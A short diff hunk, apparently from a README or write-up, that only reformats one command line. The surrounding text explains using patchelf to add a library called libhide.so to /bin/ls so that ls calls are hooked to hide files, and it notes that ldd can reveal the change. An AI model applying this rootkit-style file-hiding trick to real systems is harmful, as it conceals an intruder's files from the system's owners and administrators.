@@ -11,7 +11,7 @@ cc -fPIC -shared -Oz -fno-stack-protector -fno-asynchronous-unwind-tables -fno-i
 
 You can then use patchelf to hook calls to ls and hide files:
 
-patchelf --add-needed /lib/x86_64-linux-gnu/libhide.so /bin/ls
+$ patchelf --add-needed /lib/x86_64-linux-gnu/libhide.so /bin/ls
 
 I should note, this will be noticable using ldd only on the /bin/ls binary:
 
